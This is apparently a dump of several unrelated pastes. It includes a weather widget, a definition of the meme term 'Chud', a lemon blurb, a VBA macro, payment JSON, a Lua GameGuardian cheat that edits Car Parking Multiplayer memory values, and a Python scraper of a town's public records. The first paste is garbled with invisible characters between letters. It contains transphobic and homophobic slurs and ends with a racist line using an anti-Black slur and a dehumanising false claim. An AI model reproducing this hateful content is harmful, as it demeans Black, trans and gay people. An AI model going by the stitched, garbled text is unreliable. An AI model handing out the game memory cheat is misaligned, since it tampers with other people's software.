S‎u‎n‎s‎e‎t‎
8‎:‎0‎1‎ ‎p‎m‎
T‎h‎u‎ ‎2‎4‎ ‎|‎ ‎N‎i‎g‎h‎t‎
7‎7‎°‎
1‎1‎%‎
S‎S‎W‎
6‎
 ‎
m‎p‎h‎
M‎o‎s‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎ ‎w‎i‎l‎l‎ ‎b‎e‎c‎o‎m‎e‎ ‎p‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎a‎f‎t‎e‎r‎ ‎m‎i‎d‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎7‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎W‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
5‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
2‎:‎3‎6‎ ‎p‎m‎
F‎i‎r‎s‎t‎ ‎Q‎u‎a‎r‎t‎e‎r‎
M‎o‎o‎n‎s‎e‎t‎
1‎2‎:‎0‎7‎ ‎a‎m‎
F‎r‎i‎ ‎2‎5‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎5‎°‎
/‎7‎5‎°‎
3‎%‎
S‎E‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎6‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎4‎°‎
/‎7‎6‎°‎
7‎%‎
S‎S‎E‎ ‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎7‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎5‎°‎
/‎7‎9‎°‎
5‎%‎
S‎W‎ ‎7‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎5‎°‎
/‎7‎7‎°‎
2‎4‎%‎
N‎N‎W‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎6‎°‎
/‎7‎5‎°‎
1‎7‎%‎
N‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎3‎0‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
9‎7‎°‎
/‎7‎2‎°‎
7‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎3‎1‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎0‎°‎
/‎7‎1‎°‎
1‎%‎
N‎E‎ ‎8‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎1‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
9‎9‎°‎
/‎7‎2‎°‎
4‎%‎
E‎S‎E‎ ‎7‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎2‎
S‎u‎n‎n‎y‎
1‎0‎0‎°‎
/‎7‎4‎°‎
2‎0‎%‎
E‎S‎E‎ ‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎3‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎0‎°‎
/‎7‎4‎°‎
2‎3‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎4‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
9‎9‎°‎
/‎7‎4‎°‎
2‎4‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎5‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎0‎°‎
/‎7‎5‎°‎
1‎5‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎6‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎1‎°‎
/‎7‎4‎°‎
1‎4‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎7‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎1‎°‎
/‎7‎5‎°‎
1‎9‎%‎
S‎S‎E‎ ‎8‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎E‎n‎d‎ ‎o‎f‎ ‎S‎u‎m‎m‎e‎r‎.‎ ‎🍥🔥

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎h‎u‎d‎
A‎ ‎C‎h‎u‎d‎ ‎i‎s‎ ‎a‎ ‎f‎a‎r‎-‎r‎i‎g‎h‎t‎ ‎p‎a‎t‎r‎o‎n‎ ‎w‎i‎t‎h‎ ‎a‎n‎ ‎o‎p‎u‎s‎ ‎o‎f‎ ‎b‎i‎g‎o‎t‎r‎y‎,‎ ‎i‎n‎c‎e‎l‎i‎b‎a‎c‎y‎ ‎a‎n‎d‎ ‎s‎i‎c‎k‎ ‎f‎u‎c‎k‎e‎r‎y‎.‎ ‎T‎h‎e‎ ‎t‎e‎r‎m‎ ‎i‎s‎ ‎m‎o‎s‎t‎l‎y‎ ‎u‎s‎e‎d‎ ‎b‎y‎ ‎t‎r‎a‎n‎n‎i‎e‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎i‎r‎ ‎o‎p‎p‎o‎s‎i‎n‎g‎ ‎w‎i‎n‎g‎ ‎n‎e‎g‎a‎t‎i‎v‎e‎l‎y‎,‎ ‎b‎u‎t‎ ‎i‎s‎ ‎s‎o‎m‎e‎t‎i‎m‎e‎s‎ ‎u‎s‎e‎d‎ ‎p‎o‎s‎i‎t‎i‎v‎e‎l‎y‎ ‎a‎m‎o‎n‎g‎s‎t‎ ‎t‎h‎e‎ ‎l‎i‎k‎e‎.‎ ‎I‎t‎ ‎i‎s‎ ‎o‎f‎t‎e‎n‎ ‎d‎e‎p‎i‎c‎t‎e‎d‎ ‎w‎i‎t‎h‎ ‎a‎n‎d‎ ‎u‎s‎e‎d‎ ‎a‎l‎o‎n‎g‎s‎i‎d‎e‎ ‎""‎l‎e‎ ‎/‎p‎o‎l‎/‎ ‎f‎a‎c‎e‎""‎ ‎o‎r‎ ‎""‎l‎e‎ ‎p‎o‎l‎l‎a‎c‎k‎""‎ ‎(‎b‎a‎s‎e‎d‎ ‎o‎n‎ ‎P‎a‎t‎r‎i‎c‎k‎ ‎C‎r‎u‎s‎i‎u‎s‎✡‎)‎,‎ ‎o‎r‎i‎g‎i‎n‎a‎t‎i‎n‎g‎ ‎i‎n‎ ‎A‎u‎g‎u‎s‎t‎ ‎o‎f‎ ‎2‎0‎1‎9‎ ‎o‎n‎ ‎4‎c‎h‎a‎n‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎E‎l‎ ‎P‎a‎s‎o‎ ‎s‎h‎o‎o‎t‎i‎n‎g‎s‎.‎ ‎A‎n‎d‎ ‎r‎e‎c‎e‎n‎t‎l‎y‎ ‎a‎ ‎w‎o‎j‎a‎k‎ ‎v‎a‎r‎i‎a‎n‎t‎ ‎o‎f‎f‎ ‎i‎t‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎""‎p‎o‎l‎j‎a‎k‎""‎ ‎o‎r‎ ‎""‎c‎h‎u‎d‎j‎a‎k‎""‎,‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎i‎n‎ ‎A‎u‎g‎u‎s‎t‎ ‎o‎f‎ ‎2‎0‎2‎0‎ ‎o‎n‎ ‎B‎u‎n‎k‎e‎r‎c‎h‎a‎n‎.‎ ‎B‎o‎t‎h‎ ‎v‎e‎r‎s‎o‎n‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎C‎h‎u‎d‎ ‎m‎e‎m‎e‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎p‎o‎p‎u‎l‎a‎r‎i‎z‎e‎d‎ ‎b‎y‎ ‎l‎e‎f‎t‎i‎e‎s‎ ‎a‎n‎d‎ ‎t‎r‎a‎n‎n‎i‎e‎s‎ ‎a‎s‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎r‎e‎p‎r‎e‎s‎e‎n‎t‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎ ‎t‎y‎p‎i‎c‎a‎l‎ ‎/‎p‎o‎l‎/‎t‎a‎r‎d‎.‎

O‎r‎i‎g‎i‎n‎a‎l‎l‎y‎ ‎d‎e‎f‎i‎n‎e‎d‎ ‎a‎s‎ ‎a‎ ‎""‎a‎v‎o‎i‎d‎e‎d‎ ‎a‎n‎d‎ ‎u‎n‎a‎p‎p‎e‎a‎l‎i‎n‎g‎ ‎p‎e‎r‎s‎o‎n‎""‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎m‎o‎v‎i‎e‎ ‎C‎.‎H‎.‎U‎.‎D‎.‎ ‎(‎""‎C‎a‎n‎n‎i‎b‎a‎l‎i‎s‎t‎i‎c‎ ‎H‎u‎m‎a‎n‎o‎i‎d‎ ‎U‎n‎d‎e‎r‎g‎r‎o‎u‎n‎d‎ ‎D‎w‎e‎l‎l‎e‎r‎s‎""‎)‎ ‎u‎n‎t‎i‎l‎ ‎i‎t‎ ‎w‎a‎s‎ ‎c‎o‎r‎r‎u‎p‎t‎e‎d‎ ‎i‎n‎t‎o‎ ‎a‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎m‎e‎a‎n‎i‎n‎g‎ ‎l‎a‎s‎t‎ ‎t‎h‎u‎r‎s‎d‎a‎y‎ ‎b‎y‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎s‎ ‎(‎j‎u‎s‎t‎ ‎l‎i‎k‎e‎ ‎f‎a‎g‎g‎o‎t‎)‎.‎ ‎T‎h‎e‎ ‎t‎e‎r‎m‎'‎s‎ ‎p‎o‎p‎u‎l‎a‎r‎i‎t‎y‎ ‎i‎s‎ ‎l‎i‎k‎e‎l‎y‎ ‎m‎i‎l‎k‎e‎d‎ ‎f‎r‎o‎m‎ ‎i‎t‎'‎s‎ ‎s‎i‎m‎i‎l‎a‎r‎i‎t‎y‎ ‎t‎o‎ ‎C‎h‎a‎d‎.‎


(‎(‎ ‎C‎H‎H‎U‎U‎U‎U‎U‎D‎D‎D‎S‎S‎S‎S‎!‎!‎!‎!‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎l‎e‎m‎o‎n‎ ‎(‎C‎i‎t‎r‎u‎s‎ ‎×‎ ‎l‎i‎m‎o‎n‎)‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎s‎m‎a‎l‎l‎ ‎e‎v‎e‎r‎g‎r‎e‎e‎n‎ ‎t‎r‎e‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎l‎o‎w‎e‎r‎i‎n‎g‎ ‎p‎l‎a‎n‎t‎ ‎f‎a‎m‎i‎l‎y‎ ‎R‎u‎t‎a‎c‎e‎a‎e‎,‎ ‎n‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎A‎s‎i‎a‎,‎ ‎p‎r‎i‎m‎a‎r‎i‎l‎y‎ ‎n‎o‎r‎t‎h‎e‎a‎s‎t‎e‎r‎n‎ ‎I‎n‎d‎i‎a‎ ‎(‎A‎s‎s‎a‎m‎)‎,‎ ‎n‎o‎r‎t‎h‎e‎r‎n‎ ‎M‎y‎a‎n‎m‎a‎r‎,‎ ‎a‎n‎d‎ ‎C‎h‎i‎n‎a‎.‎ ‎T‎h‎e‎ ‎t‎r‎e‎e‎'‎s‎ ‎e‎l‎l‎i‎p‎s‎o‎i‎d‎a‎l‎ ‎y‎e‎l‎l‎o‎w‎ ‎f‎r‎u‎i‎t‎ ‎i‎s‎ ‎u‎s‎e‎d‎ ‎f‎o‎r‎ ‎c‎u‎l‎i‎n‎a‎r‎y‎ ‎a‎n‎d‎ ‎n‎o‎n‎-‎c‎u‎l‎i‎n‎a‎r‎y‎ ‎p‎u‎r‎p‎o‎s‎e‎s‎ ‎t‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎,‎ ‎p‎r‎i‎m‎a‎r‎i‎l‎y‎ ‎f‎o‎r‎ ‎i‎t‎s‎ ‎j‎u‎i‎c‎e‎,‎ ‎w‎h‎i‎c‎h‎ ‎h‎a‎s‎ ‎b‎o‎t‎h‎ ‎c‎u‎l‎i‎n‎a‎r‎y‎ ‎a‎n‎d‎ ‎c‎l‎e‎a‎n‎i‎n‎g‎ ‎u‎s‎e‎s‎.‎ ‎T‎h‎e‎ ‎p‎u‎l‎p‎ ‎a‎n‎d‎ ‎r‎i‎n‎d‎ ‎a‎r‎e‎ ‎a‎l‎s‎o‎ ‎u‎s‎e‎d‎ ‎i‎n‎ ‎c‎o‎o‎k‎i‎n‎g‎ ‎a‎n‎d‎ ‎b‎a‎k‎i‎n‎g‎.‎ ‎T‎h‎e‎ ‎d‎i‎s‎t‎i‎n‎c‎t‎i‎v‎e‎ ‎s‎o‎u‎r‎ ‎t‎a‎s‎t‎e‎ ‎o‎f‎ ‎l‎e‎m‎o‎n‎ ‎j‎u‎i‎c‎e‎,‎ ‎d‎e‎r‎i‎v‎e‎d‎ ‎f‎r‎o‎m‎ ‎c‎i‎t‎r‎i‎c‎ ‎a‎c‎i‎d‎,‎ ‎m‎a‎k‎e‎s‎ ‎i‎t‎ ‎a‎ ‎k‎e‎y‎ ‎i‎n‎g‎r‎e‎d‎i‎e‎n‎t‎ ‎i‎n‎ ‎d‎r‎i‎n‎k‎s‎ ‎a‎n‎d‎ ‎f‎o‎o‎d‎s‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎a‎ ‎w‎h‎o‎l‎e‎ ‎a‎n‎d‎ ‎h‎a‎l‎v‎e‎d‎ ‎l‎e‎m‎o‎n‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎a‎ ‎b‎l‎a‎c‎k‎ ‎b‎a‎c‎k‎g‎r‎o‎u‎n‎d‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎I‎v‎a‎r‎ ‎L‎e‎i‎d‎u‎s‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎i‎s‎ ‎i‎s‎ ‎N‎e‎w‎s‎ ‎N‎e‎d‎ ‎s‎i‎g‎n‎i‎n‎g‎ ‎o‎f‎f‎ ‎w‎i‎t‎h‎ ‎a‎ ‎r‎a‎n‎d‎o‎m‎ ‎f‎a‎c‎t‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎N‎i‎g‎g‎e‎r‎s‎ ‎e‎v‎o‎l‎v‎e‎d‎ ‎f‎r‎o‎m‎ ‎m‎o‎n‎k‎e‎y‎s‎!‎ ‎T‎h‎e‎ ‎m‎o‎r‎e‎ ‎y‎o‎u‎ ‎k‎n‎o‎w‎!‎ ‎🌈⭐️"
4i3ZNwa7,Untitled,Alx09,C,Thursday 24th of August 2023 08:02:32 AM CDT,"Sub Buton2_Clic()
    Dim sumaCautata As Double
    Dim coloana As Range
    
    sumaCautata = InputBox(""Introduceti suma pe care doriti sa o atingeti:"")
    Set coloana = Range(""A1:A"" & Cells(Rows.Count, 1).End(xlUp).Row)
    
    ClearColumnC2 ' Cură?ăm coloana C2 înainte de a începe
    
    Dim usedRows() As Boolean
    ReDim usedRows(1 To coloana.Rows.Count) As Boolean
    
    FindSums coloana, sumaCautata, 1, """", 0, usedRows
End Sub

Sub FindSums(coloana As Range, sumaCautata As Double, rowIndex As Long, indices As String, currentSum As Double, usedRows() As Boolean)
    Dim celula As Range
    
    For i = rowIndex To coloana.Rows.Count
        Set celula = coloana.Cells(i, 1)
        
        If celula.Value <> """" And IsNumeric(celula.Value) And Not usedRows(i) Then
            Dim newSum As Double
            newSum = currentSum + celula.Value
            
            If newSum = sumaCautata Then
                WriteIndices indices & celula.Row & "" "" ' Înregistrăm indicele rândului
                usedRows(i) = True
            ElseIf newSum < sumaCautata Then
                FindSums coloana, sumaCautata, i + 1, indices & celula.Row & "" "", newSum, usedRows ' Apelăm recursiv pentru următorul rând
            End If
        End If
    Next i
End Sub

Sub WriteIndices(indices As String)
    Dim lastRow As Long
    lastRow = Range(""C"" & Rows.Count).End(xlUp).Row + 1
    
    Range(""C"" & lastRow).Value = Trim(indices)
End Sub

Sub ClearColumnC2()
    Range(""C:C"").ClearContents
End Sub

"
TcgxrfzT,Untitled,williansebastiao,JSON,Thursday 24th of August 2023 07:59:47 AM CDT,"{
    ""links"": {
        ""next"": null,
        ""previous"": null
    },
    ""count"": 4,
    ""results"": [
        {
            ""id"": 1,
            ""protocol"": ""ZPJFNAZP"",
            ""unique_key"": ""SVBWQSBDb3RhIDEgLSAyMDIzfGlwdmFfaW5zdGFsbG1lbnQ="",
            ""bill_relationship_status"": ""AWATING_BILL_GENERATION"",
            ""bill_relationship_date"": null,
            ""description"": ""IPVA Cota 1 - 2023"",
            ""title"": ""IPVA Cota 1 - 2023"",
            ""category"": ""IPVA"",
            ""amount"": ""408.68"",
            ""bill_relationship_attempts"": 0,
            ""state"": ""MG"",
            ""mat_status"": {
                ""settled"": 0,
                ""in_progress"": 1,
                ""error"": 0,
                ""total"": 1,
                ""concatenate_status"": ""PAYMENT_INITIATED-CREATED""
            },
            ""order_status"": ""PAYMENT_INITIATED"",
            ""bill_status"": ""CREATED""
        },
        {
            ""id"": 2,
            ""protocol"": ""4Z23LCZP"",
            ""unique_key"": ""ipva-2023"",
            ""bill_relationship_status"": ""AWATING_BILL_GENERATION"",
            ""bill_relationship_date"": null,
            ""description"": ""IPVA 2023 - Cota Única"",
            ""title"": ""IPVA 2023 - Cota Única"",
            ""category"": ""IPVA"",
            ""amount"": ""2457.21"",
            ""bill_relationship_attempts"": 0,
            ""state"": ""RJ"",
            ""mat_status"": {
                ""settled"": 0,
                ""in_progress"": 3,
                ""error"": 0,
                ""total"": 3,
                ""concatenate_status"": ""CHECKOUT_FAIL-CREATED""
            },
            ""order_status"": ""CHECKOUT_FAIL"",
            ""bill_status"": null
        },
        {
            ""id"": 3,
            ""protocol"": ""4Z23LCZP"",
            ""unique_key"": ""licensing-2023"",
            ""bill_relationship_status"": ""AWATING_BILL_GENERATION"",
            ""bill_relationship_date"": null,
            ""description"": ""Licenciamento 2023"",
            ""title"": ""Licenciamento 2023"",
            ""category"": ""LICENSING"",
            ""amount"": ""183.24"",
            ""bill_relationship_attempts"": 0,
            ""state"": ""RJ"",
            ""mat_status"": {
                ""settled"": 0,
                ""in_progress"": 3,
                ""error"": 0,
                ""total"": 3,
                ""concatenate_status"": ""CHECKOUT_FAIL-CREATED""
            },
            ""order_status"": ""CHECKOUT_FAIL"",
            ""bill_status"": null
        },
        {
            ""id"": 4,
            ""protocol"": ""4Z23LCZP"",
            ""unique_key"": ""B87223832"",
            ""bill_relationship_status"": ""AWATING_BILL_GENERATION"",
            ""bill_relationship_date"": null,
            ""description"": ""Transitar em velocidade superior à máxima permitida em até 20%"",
            ""title"": ""Infração - N. Auto B87223832"",
            ""category"": ""TICKET"",
            ""amount"": ""104.12"",
            ""bill_relationship_attempts"": 0,
            ""state"": ""RJ"",
            ""mat_status"": {
                ""settled"": 0,
                ""in_progress"": 3,
                ""error"": 0,
                ""total"": 3,
                ""concatenate_status"": ""CHECKOUT_FAIL-CREATED""
            },
            ""order_status"": ""CHECKOUT_FAIL"",
            ""bill_status"": null
        }
    ],
    ""total_amount"": 3153.25
}"
Dm38ZTbH,ufo,yahya_klm,Lua,Thursday 24th of August 2023 07:59:21 AM CDT,"
kntl=""ঔৣ͜͡➳〘✘〙""
mmk=""ঔৣ͜͡➳〘✓〙""
hh1= kntl
hh2= kntl
hh3= kntl
gg.alert(""GAME : CAR PARKING MULTIPLAYER🎮\nSCRIPT ABOUT : CHROME HACK\nCREATOR : 9ABIS CPM - MANSORY✍️ \nYOUTUBE CHANNEL : 9ABIS YT▶️ \nEXPIRED IN : 2023/08/30⌛"") 
function main()

totti=gg.choice({
              ""ঔৣ͜͡➳           『 GOLDEN🥇CAR      』"",
              ""ঔৣ͜͡➳           『 SILVER🥈CAR        』"",
              ""ঔৣ͜͡➳           『 EXIT🚪                   』"",}, nil, (os.date(""✧═════• ༺༻ •═════✧\n➳〘9ABIS CPM | MANSOORY〙\n✧═════• ༺༻ •═════✧\n➳〘📅%Y/%m/%d〙|〘🕘%H:%M〙\n✧═════• ༺༻ •═════✧"")))
if totti == 1 then Y1() end
if totti == 2 then Y2()end
if totti == 3 then Y3() end
menuk=-1
end
function Y3()
gg.alert(""╟═════⋆✪⋆══════╢\nCreator : 9ABIS CPM\n╟═════⋆✪⋆══════╢\n➣TELEGRAM : @QABISYT • @lagl9\n╟═════⋆✪⋆══════╢\n➣YOUTUBE : \n 9ABIS CPM • MANSOORYالمطور"")
gg.toast(""Creator - 9𝙰𝙱𝙸𝚂 𝚈𝚃"")
_G[""print""]("" ❏━━━━━━━━━━━━━━━━━━━❏"")
_G[""print""](""سينتهي يوم ⌛ : 2023/09/01"")
_G[""print""](""❏━━━━━━━━━━━━━━━━━━━❏"")
_G[""print""]("" \nCAR PARKING V4.8.12.7"")
_G[""print""](""\n❤️ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ ꜱᴄʀɪᴘᴛ❤️"")
os.exit()
end

function Y1()
gg.alert(""اذهب لمكان تغيير اللون و من بعد حول للريفليكشن"")
gg.alert(""⬆️ ارفع لفوق ⬆️"") gg.sleep(1000)
gg.ftch(""1"", gg.TYPE_FLOAT)
gg.alert(""⬇️ نزل لتحت ⬇️"") gg.sleep(1000)
gg.refineNumber(""0"", gg.TYPE_FLOAT)
gg.alert(""⬆️ ارفع لفوق ⬆️"") gg.sleep(1000)
gg.refineNumber(""1"", gg.TYPE_FLOAT)
gg.alert(""⬇️ نزل لتحت ⬇️"") gg.sleep(1000)
gg.refineNumber(""0"", gg.TYPE_FLOAT)
gg.alert(""⬆️ ارفع لفوق ⬆️"") gg.sleep(1000)
gg.refineNumber(""1"", gg.TYPE_FLOAT)
gg.alert(""⬇️ نزل لتحت ⬇️"") gg.sleep(1000)
gg.refineNumber(""0"", gg.TYPE_FLOAT)
gg.alert(""⬆️ ارفع لفوق ⬆️"") gg.sleep(1000)
gg.refineNumber(""1"", gg.TYPE_FLOAT)
gg.getResults(100)
gg.editAll(""100;50;-5"", gg.TYPE_FLOAT)
gg.clearResults()
gg.alert(""✓DONE✓"")
end
function Y2()
gg.alert(""اذهب لمكان تغيير اللون و من بعد حول للريفليكشن"")
gg.alert(""⬆️ ارفع لفوق ⬆️"") gg.sleep(1000)
gg.ftch(""1"", gg.TYPE_FLOAT)
gg.alert(""⬇️ نزل لتحت ⬇️"") gg.sleep(1000)
gg.refineNumber(""0"", gg.TYPE_FLOAT)
gg.alert(""⬆️ ارفع لفوق ⬆️"") gg.sleep(1000)
gg.refineNumber(""1"", gg.TYPE_FLOAT)
gg.alert(""⬇️ نزل لتحت ⬇️"") gg.sleep(1000)
gg.refineNumber(""0"", gg.TYPE_FLOAT)
gg.alert(""⬆️ ارفع لفوق ⬆️"") gg.sleep(1000)
gg.refineNumber(""1"", gg.TYPE_FLOAT)
gg.alert(""⬇️ نزل لتحت ⬇️"") gg.sleep(1000)
gg.refineNumber(""0"", gg.TYPE_FLOAT)
gg.alert(""⬆️ ارفع لفوق ⬆️"") gg.sleep(1000)
gg.refineNumber(""1"", gg.TYPE_FLOAT)
gg.getResults(100)
gg.editAll(""100;50;-5"", gg.TYPE_FLOAT)
gg.clearResults()
gg.alert(""✓DONE✓"")
end
while true do
  if gg.isVisible(true) then
    menuk = 1
    gg.setVisible(false)
  end
  if menuk == 1 then
    main()
  end
  if menu == 2 then
    main()
  end
  menuk = -1
end 


"
DLauhj75,Untitled,FerdinandoLM,Python,Thursday 24th of August 2023 07:53:40 AM CDT,"from bs4 import BeautifulSoup
import requests
import pandas as pd
from tqdm import tqdm
import os
from datetime import datetime

#Gets the last scraped url from txt file
def get_last_link(n):
    with open(str(n) + '.txt', 'r') as f:
        last_link = f.read()

    return last_link

#Sets the last scraped url on a txt file
def write_last_link(n, link):
    with open(str(n) + '.txt', 'w') as f:
        f.write(link)
 
#Analyzes the pages and lists all the urls to scrape        
def get_all_links(url, last_link):
    resp = requests.get(url + str(0))
    soup = BeautifulSoup(resp.text, 'html.parser')
    
    #Pages variable is set fixed or variable in order to reduce the pages scraped and reduce the tests timings.
    #pages=1
    pages = int(soup.find(class_='u-layout-prose').find_all(class_='Grid-cell')[-2].text)
    all_links = ['http://comune.grammichele.ct.it' + a.find('a').attrs['href'] for a in soup.find('table').find_all('tr')[1:-1]]
    print('Collecting links 1/' + str(pages))
    
    if last_link in all_links:
        return all_links

    for p in range(1, pages):
        resp = requests.get(url + str(p))
        soup = BeautifulSoup(resp.text, 'html.parser')
        links = ['http://comune.grammichele.ct.it' + a.find('a').attrs['href'] for a in soup.find('table').find_all('tr')[1:-1]]
        all_links.extend(links)
        print('Collecting links ' + str(p+1) + '/' + str(pages))
        if last_link in links:
            break

    return all_links

#Defining downloads of attachments
def download(url, path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(path, 'wb') as f:
            f.write(response.content)

def create_dir(path):
    if not os.path.isdir(path):
        os.mkdir(path)

#This variable defines the different ways to scrape each website page, because not every page has the same url structure.
main_links = {1:'http://comune.grammichele.ct.it/mc/mc_p_ricerca.php?x=&pag=',
              2:'http://comune.grammichele.ct.it/mc/mc_p_ricerca.php?servizio=&sto=1&pag=0',
              3:'http://comune.grammichele.ct.it/zf/index.php/atti-amministrativi/delibere/index/table-delibere-public-page/',
              4:'http://comune.grammichele.ct.it/zf/index.php/atti-amministrativi/determine/index/table-determine-public-page/',
              5:'http://comune.grammichele.ct.it/zf/index.php/atti-amministrativi/ordinanze/index/table-ordinanze-public-page/'}
              
#Here i set variable to understand which number pick up from the scraped page.
for_folder_name = {1:'Numero pubblicazione',
                   2:'Numero pubblicazione',
                   3:'Numero delibera',
                   4:'Registro generale',
                   5:'Registro generale'}
                   
create_dir('Downloads')

#Checking urls
for i in (main_links):
    last_link = get_last_link(i)
    url = main_links[i]
    all_links = get_all_links(url, last_link)
    write_last_link(i, all_links[0])
    all_attrs = []
    
    #Here i create the subdirectory related on which section i'm workin to
    create_dir(os.path.join('Downloads', str(i)))
    row_number = 0
    for l in tqdm(all_links[:]):
        if l == last_link:
            print('Last link scraped found: ' + l)
            break
        attrs = {}
        resp = requests.get(l)
        soup = BeautifulSoup(resp.text)
        doc_links = []
        names = []
        #Scraping part begins here
        for a in soup.find_all(class_='detail-row'):
            attrs[a.find(class_='detail-label').text] = a.find(class_='detail-value').text.strip()
            
            #If sections 1 and 2 are being scraped, attachment urls must be handled differently
            if i<3:
                doc_links.extend(['http://comune.grammichele.ct.it/mc/' + link.attrs['onclick'].split(""'"")[1] for link in soup.find_all('a', {'href':'javascript:void(0);'})])
                names.extend([link.text.strip() for link in soup.find_all('a', {'href':'javascript:void(0);'})])
            else:
                doc_links.extend(['http://comune.grammichele.ct.it/de' + link.attrs['href'].split('de')[1] for link in a.find_all('a', {'target':'_blank'})])
                names.extend([link.text.strip() for link in soup.find_all('a', {'target':'_blank'})])

        #Try to create folder, if no specific number has been found, use Row number as name.
        try:
            old_date = str(attrs['Data inizio pubblicazione'].replace('/', '-'))
            new_time = datetime.strptime(old_date, ""%d-%m-%Y"").strftime(""%Y-%m-%d"")
            folder_name = new_time + '_' + attrs[for_folder_name[i]]
            
        except Exception as e:
            folder_name = 'Row ' + str(row_number)
        

        

        create_dir(os.path.join('Downloads', str(i), folder_name))
        
        for url, name in zip(set(doc_links), set(names)):
            # remove when confirmed
            print(url, name)
            
            #Downloading attachments here.
            #In order to prevent dead urls, try/except is needed, but it gets stuck from time to time.
            #If the file fails to download, append a line on a log file.
            #No timeout exception provided.
   
            try:
                download(url, os.path.join('Downloads', str(i), folder_name, name))
            except:
                errored = str(datetime.today().strftime('%Y-%m-%d_%H-%M-%S') + ' ' + 'Error downloading' + ' ' + url + ' ' + str(i) + ' ' + folder_name + ' ' + name + ' from url ' + last_link)
                with open('log.txt', 'a') as f:
                    f.write(errored+'\n')
        
        #Collect all scraped data
        attrs['Document Names in Folder'] = (', ').join(names)
        attrs['Link'] = l
        
        all_attrs.append(attrs)
        row_number+=1
       
    #Prepare data and output all collected data into an excel file
    df = pd.DataFrame(all_attrs).fillna('')
    currdate=datetime.today().strftime('%Y-%m-%d_%H-%M-%S')
    df.to_excel(os.path.join('Downloads', str(currdate) + ' ' + str(i) + '.xlsx'))"
